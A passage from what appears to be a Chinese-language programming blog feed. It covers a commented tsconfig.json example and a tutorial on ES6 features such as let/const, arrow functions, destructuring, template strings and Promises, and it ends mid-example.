boolean">true</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">// 删除编译后的所有的注释</span>    <span class="token string">"noEmit"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                        <span class="token comment" spellcheck="true">// 不生成输出文件</span>    <span class="token string">"importHelpers"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                 <span class="token comment" spellcheck="true">// 从 tslib 导入辅助工具函数</span>    <span class="token string">"isolatedModules"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>               <span class="token comment" spellcheck="true">// 将每个文件做为单独的模块 （与 'ts.transpileModule' 类似）.</span>    <span class="token comment" spellcheck="true">/* 严格的类型检查选项 */</span>    <span class="token string">"strict"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                        <span class="token comment" spellcheck="true">// 启用所有严格类型检查选项</span>    <span class="token string">"noImplicitAny"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                 <span class="token comment" spellcheck="true">// 在表达式和声明上有隐含的 any类型时报错</span>    <span class="token string">"strictNullChecks"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>              <span class="token comment" spellcheck="true">// 启用严格的 null 检查</span>    <span class="token string">"noImplicitThis"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">// 当 this 表达式值为 any 类型的时候，生成一个错误</span>    <span class="token string">"alwaysStrict"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                  <span class="token comment" spellcheck="true">// 以严格模式检查每个模块，并在每个文件里加入 'use strict'</span>    <span class="token comment" spellcheck="true">/* 额外的检查 */</span>    <span class="token string">"noUnusedLocals"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">// 有未使用的变量时，抛出错误</span>    <span class="token string">"noUnusedParameters"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">// 有未使用的参数时，抛出错误</span>    <span class="token string">"noImplicitReturns"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>             <span class="token comment" spellcheck="true">// 并不是所有函数里的代码都有返回值时，抛出错误</span>    <span class="token string">"noFallthroughCasesInSwitch"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 报告 switch 语句的 fallthrough 错误。（即，不允许 switch 的 case 语句贯穿）</span>    <span class="token comment" spellcheck="true">/* 模块解析选项 */</span>    <span class="token string">"moduleResolution"</span><span class="token punctuation">:</span> <span class="token string">"node"</span><span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">// 选择模块解析策略： 'node' (Node.js) or 'classic' (TypeScript pre-1.6)</span>    <span class="token string">"baseUrl"</span><span class="token punctuation">:</span> <span class="token string">"./"</span><span class="token punctuation">,</span>                       <span class="token comment" spellcheck="true">// 用于解析非相对模块名称的基目录</span>    <span class="token string">"paths"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                           <span class="token comment" spellcheck="true">// 模块名到基于 baseUrl 的路径映射的列表</span>    <span class="token string">"rootDirs"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                        <span class="token comment" spellcheck="true">// 根文件夹列表，其组合内容表示项目运行时的结构内容</span>    <span class="token string">"typeRoots"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                       <span class="token comment" spellcheck="true">// 包含类型声明的文件列表</span>    <span class="token string">"types"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                           <span class="token comment" spellcheck="true">// 需要包含的类型声明文件名列表</span>    <span class="token string">"allowSyntheticDefaultImports"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// 允许从没有设置默认导出的模块中默认导入。</span>    <span class="token comment" spellcheck="true">/* Source Map Options */</span>    <span class="token string">"sourceRoot"</span><span class="token punctuation">:</span> <span class="token string">"./"</span><span class="token punctuation">,</span>                    <span class="token comment" spellcheck="true">// 指定调试器应该找到 TypeScript 文件而不是源文件的位置</span>    <span class="token string">"mapRoot"</span><span class="token punctuation">:</span> <span class="token string">"./"</span><span class="token punctuation">,</span>                       <span class="token comment" spellcheck="true">// 指定调试器应该找到映射文件而不是生成文件的位置</span>    <span class="token string">"inlineSourceMap"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>               <span class="token comment" spellcheck="true">// 生成单个 soucemaps 文件，而不是将 sourcemaps 生成不同的文件</span>    <span class="token string">"inlineSources"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                 <span class="token comment" spellcheck="true">// 将代码与 sourcemaps 生成到一个文件中，要求同时设置了 --inlineSourceMap 或 --sourceMap 属性</span>    <span class="token comment" spellcheck="true">/* 其他选项 */</span>    <span class="token string">"experimentalDecorators"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 启用装饰器</span>    <span class="token string">"emitDecoratorMetadata"</span><span class="token punctuation">:</span> <span class="token boolean">true</span>          <span class="token comment" spellcheck="true">// 为装饰器提供元数据的支持</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>使用<code>&quot;files&quot;</code>属性</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span>  <span class="token string">"files"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token string">"./some/file.ts"</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><ul><li><p>使用<code>&quot;include&quot;</code>和<code>&quot;exclude&quot;</code>属性  </p><p>你可以使用 <code>include</code> 和 <code>exclude</code> 选项来指定需要包含的文件，和排除的文件：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span>  <span class="token string">"include"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token string">"./folder"</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string">"exclude"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token string">"./folder/**/*.spec.ts"</span><span class="token punctuation">,</span>    <span class="token string">"./folder/someSubFolder"</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ES6特性</title>
      <link href="2019/08/09/es6/"/>
      <url>2019/08/09/es6/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ES全称ECMAScript，ECMAScript是ECMA制定的标准化脚本语言。目前JavaScript使用的ECMAScript版本为ECMAScript-262。</p><p>ECMAScript 标准建立在一些原有的技术上，最为著名的是 JavaScript (网景) 和 JScript (微软)。它最初由网景的 Brendan Eich 发明，第一次出现是在网景的 Navigator 2.0 浏览器上。Netscape 2.0 以及微软 Internet Explorer 3.0 后序的所有浏览器上都有它的身影。</p><table><thead><tr><th>ECMAScript版本</th><th>发布时间</th><th>新增特性</th></tr></thead><tbody><tr><td>ECMAScript 2009(ES5)</td><td>2009年11月</td><td>扩展了Object、Array、Function的功能等</td></tr><tr><td>ECMAScript 2015(ES6)</td><td>2015年6月</td><td>类，模块化，箭头函数，函数参数默认值等</td></tr><tr><td>ECMAScript 2016(ES7)</td><td>2016年3月</td><td>includes，指数操作符</td></tr><tr><td>ECMAScript 2017(ES8)</td><td>2017年6月</td><td>sync/await，Object.values()，Object.entries()，String padding等</td></tr></tbody></table><h2 id="ES6-特性"><a href="#ES6-特性" class="headerlink" title="ES6 特性"></a>ES6 特性</h2><p>下面会介绍几个比较常用的新特性：</p><ul><li>变量let和const</li><li>箭头函数</li><li>解构赋值</li><li>模板字符串</li><li>默认参数</li><li>对象属性简写</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Using_promises" target="_blank" rel="noopener">Promise</a></li><li>类Class</li><li>模块Module</li></ul><h3 id="1、变量let、const和var"><a href="#1、变量let、const和var" class="headerlink" title="1、变量let、const和var"></a>1、变量let、const和var</h3><h4 id="let"><a href="#let" class="headerlink" title="let"></a>let</h4><ol><li><p>let为JavaScript新增了块级作用，let声明的变量只在其所在代码块有效；</p></li><li><p>不存在变量提升，必须先定义后使用</p><pre class="line-numbers language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ReferenceError</span><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>暂时性死区  只要块级作用域内存在let命令，他声明的变量就是绑定在这个区域，不再受外部影响；ES6 明确规定，如果区块中存在let和const命令，这个区块对这些命令声明的变量，从一开始就形成了封闭作用域。凡是在声明之前就使用这些变量，就会报错。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// TDZ开始</span>  tmp <span class="token operator">=</span> <span class="token string">'abc'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ReferenceError</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ReferenceError</span>  <span class="token keyword">let</span> tmp<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// TDZ结束</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// undefined</span>  tmp <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 123</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>不允许重复声明</p></li></ol><h4 id="const"><a href="#const" class="headerlink" title="const"></a>const</h4><ol><li><p>const用来声明常量，一旦声明，其值就不能改变；</p></li><li><p>const一旦声明常量就必须立即赋值。只声明不赋值就会报错</p></li><li><p>和let命令相同：只能在所声明的块级作用域内有效</p></li><li><p>const命令声明的常量也不能提升，同样存在暂时性死区，只能在声明后使用</p></li><li><p>onst也不能重复声明常量</p></li><li><p>const命令只是保证变量指向的地址不变，并不保证改地址的数据不变</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> foo <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>foo<span class="token punctuation">.</span>prop <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>foo<span class="token punctuation">.</span>prop<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="2、箭头函数"><a href="#2、箭头函数" class="headerlink" title="2、箭头函数"></a>2、箭头函数</h3><p>ES6允许使用箭头（=&gt;）定义函数。 </p><p>=&gt;不只是关键字function的简写，它还带来了其它好处。箭头函数与包围它的代码共享同一个this,能帮你很好的解决this的指向问题。有经验的JavaScript开发者都熟悉诸如var self = this;或var that = this这种引用外围this的模式。但借助=&gt;，就不需要这种模式了。</p><p>如果箭头函数不需要参数或者需要多个参数，就是用圆括号代表参数部分。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> sum <span class="token operator">=</span> <span class="token punctuation">(</span>num1<span class="token punctuation">,</span>num2<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> num1<span class="token operator">+</span>num2<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>箭头函数的特点：</p><ol><li>函数体内的this对象就是定义时所在的对象，而不是他使用时所在的对象</li><li>不可以当做构造函数，也就是说不可以使用new命令，否则会抛出一个错误</li><li>不可以使用arguments对象，该对象在函数体内不存在，如果要使用可以用rest参数代替</li><li>不可以使用yield命令，因此箭头函数不能用作Generator函数</li></ol><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//箭头函数中this指向固定</span><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'id:'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> id <span class="token operator">=</span> <span class="token number">21</span><span class="token punctuation">;</span>foo<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">{</span> id<span class="token punctuation">:</span> <span class="token number">42</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// id: 42</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、解构赋值"><a href="#3、解构赋值" class="headerlink" title="3、解构赋值"></a>3、解构赋值</h3><p>ES6允许按照一定的模式，从数组和对象中提取值，对变量进行赋值，这被称为 解构</p><h4 id="变量解构"><a href="#变量解构" class="headerlink" title="变量解构"></a>变量解构</h4><ol><li><p>数组解构</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> <span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>x <span class="token comment" spellcheck="true">//a</span><span class="token keyword">let</span> <span class="token punctuation">[</span>foo <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>foo <span class="token comment" spellcheck="true">//true</span><span class="token keyword">let</span> <span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">let</span> <span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span>undefined<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//以上两种输出都是 </span>x <span class="token comment" spellcheck="true">//a</span>y <span class="token comment" spellcheck="true">//b</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>对象解构</p><p>对象的解构与数组的解构有一个重要的不同；数组的元素是按次序排列的，变量的取之由他的位置决定；而对象的属性是没有次序的，变量必须与属性同名，才能取到正确的值</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> <span class="token punctuation">{</span>bar<span class="token punctuation">,</span>foo<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token punctuation">{</span>foo<span class="token punctuation">:</span><span class="token string">"aaa"</span><span class="token punctuation">,</span>bar<span class="token punctuation">:</span><span class="token string">"bbb"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>bar <span class="token comment" spellcheck="true">// bbb</span>foo <span class="token comment" spellcheck="true">//aaa</span><span class="token keyword">let</span> <span class="token punctuation">{</span>baz<span class="token punctuation">,</span>foo<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token punctuation">{</span>foo<span class="token punctuation">:</span><span class="token string">"aaa"</span><span class="token punctuation">,</span>bar<span class="token punctuation">:</span><span class="token string">"bbb"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>baz <span class="token comment" spellcheck="true">//undefined</span>如果变量名与属性名不一致<span class="token keyword">let</span> <span class="token punctuation">{</span>first<span class="token punctuation">:</span>f<span class="token punctuation">,</span> last<span class="token punctuation">:</span>l<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token punctuation">{</span>first<span class="token punctuation">:</span><span class="token string">"hello"</span><span class="token punctuation">,</span> last<span class="token punctuation">:</span><span class="token string">"bye"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>first <span class="token comment" spellcheck="true">//undefined</span>f <span class="token comment" spellcheck="true">//hello</span>last <span class="token comment" spellcheck="true">//undefined</span>l <span class="token comment" spellcheck="true">//bye</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是说对象解构赋值的内部机制，是先找到同名属性，然后在赋值给对应的变量，真正被赋值的是后者，而不是前者</p></li></ol><h4 id="函数解构"><a href="#函数解构" class="headerlink" title="函数解构"></a>函数解构</h4><p>参数默认值可以与解构赋值的默认值结合使用</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//undefined,5</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//1,5</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//1,2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4、模板字符串"><a href="#4、模板字符串" class="headerlink" title="4、模板字符串"></a>4、模板字符串</h3><p>模版字符串是增强版的字符串，用反引号(`)标识；他可以当作普通字符串使用，也可以用来定义多行字符串，或者在字符串中嵌入变量</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> name<span class="token operator">=</span><span class="token string">"Tom"</span><span class="token punctuation">,</span>time<span class="token operator">=</span><span class="token string">"today"</span><span class="token punctuation">;</span><span class="token template-string"><span class="token string">`hello </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">,how arw your </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>time<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>大括号里面可以放任意的JavaScript表达式，可以进行运算，以及引用对象属性。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">let</span> y <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>x<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">+</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>y<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>x<span class="token operator">+</span>y<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token comment" spellcheck="true">//1+2=3</span><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>x<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>obj<span class="token punctuation">.</span>x<span class="token operator">+</span>obj<span class="token punctuation">.</span>y<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token comment" spellcheck="true">// 4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>模版字符串中还能调用函数</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token string">"hehe"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token template-string"><span class="token string">`test </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token comment" spellcheck="true">// test hehe</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>多行字符串</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//ES5中</span><span class="token keyword">var</span> roadPoem <span class="token operator">=</span> <span class="token string">'Then took the other, as just as fair,nt'</span>    <span class="token operator">+</span> <span class="token string">'And having perhaps the better claimnt'</span>    <span class="token operator">+</span> <span class="token string">'Because it was grassy and wanted wear,nt'</span>    <span class="token operator">+</span> <span class="token string">'Though as for that the passing therent'</span>    <span class="token operator">+</span> <span class="token string">'Had worn them really about the same,nt'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ES6</span><span class="token keyword">let</span> roadPoem <span class="token operator">=</span> `Then took the other<span class="token punctuation">,</span> <span class="token keyword">as</span> just <span class="token keyword">as</span> fair<span class="token punctuation">,</span>    And having perhaps the better claim    Because it was grassy and wanted wear<span class="token punctuation">,</span>    Though <span class="token keyword">as</span> <span class="token keyword">for</span> that the passing there<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5、默认参数"><a href="#5、默认参数" class="headerlink" title="5、默认参数"></a>5、默认参数</h3><p>我们以前不得不通过下面方式来定义默认参数</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> link <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>height<span class="token punctuation">,</span> color<span class="token punctuation">,</span> url<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> height <span class="token operator">=</span> height <span class="token operator">||</span> <span class="token number">50</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> color <span class="token operator">=</span> color <span class="token operator">||</span> <span class="token string">'red'</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> url <span class="token operator">=</span> url <span class="token operator">||</span> <span class="token string">'http://azat.co'</span><span class="token punctuation">;</span>    <span class="token operator">...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一切工作都是正常的，直到参数值是0后，就有问题了，因为在JavaScript中，0表示false，它是默认被hard-coded的值，而不能变成参数本身的值。当然，如果你非要用0作为值，我们可以忽略这一缺陷并且使用逻辑OR就行了！但在ES6，我们可以直接把默认值放在函数申明里：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> link <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>height <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">,</span> color <span class="token operator">=</span> <span class="token string">'red'</span><span class="token punctuation">,</span> url <span class="token operator">=</span> <span class="token string">'http://azat.co'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token operator">...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="6、对象属性简写"><a href="#6、对象属性简写" class="headerlink" title="6、对象属性简写"></a>6、对象属性简写</h3><p>ES5中对象必须包含属性和值</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> name<span class="token operator">=</span><span class="token string">'Ming'</span><span class="token punctuation">,</span>age<span class="token operator">=</span><span class="token string">'18'</span><span class="token punctuation">,</span>city<span class="token operator">=</span><span class="token string">'Shanghai'</span><span class="token punctuation">;</span><span class="token keyword">const</span> student <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span>name<span class="token punctuation">,</span>    age<span class="token punctuation">:</span>age<span class="token punctuation">,</span>    city<span class="token punctuation">:</span>city<span class="token punctuation">}</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>student<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//{name: "Ming", age: "18", city: "Shanghai"}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用ES6的话就会变得非常简洁</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> name<span class="token operator">=</span><span class="token string">'Ming'</span><span class="token punctuation">,</span>age<span class="token operator">=</span><span class="token string">'18'</span><span class="token punctuation">,</span>city<span class="token operator">=</span><span class="token string">'Shanghai'</span><span class="token punctuation">;</span><span class="token keyword">const</span> student <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">,</span>    age<span class="token punctuation">,</span>    city<span class="token punctuation">}</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>student<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//{name: "Ming", age: "18", city: "Shanghai"}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="7、Promise"><a href="#7、Promise" class="headerlink" title="7、Promise"></a>7、Promise</h3><p>Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大。它由社区最早提出和实现，ES6 将其写进了语言标准，统一了用法，原生提供了Promise对象。</p><p>下面是一个简单的用setTimeout()实现的异步延迟加载函数:</p><pre class="line-numbers language-js"><code class="language-js"><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Test!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在ES6中，我们可以用promise重写:</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> wait1000 <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span 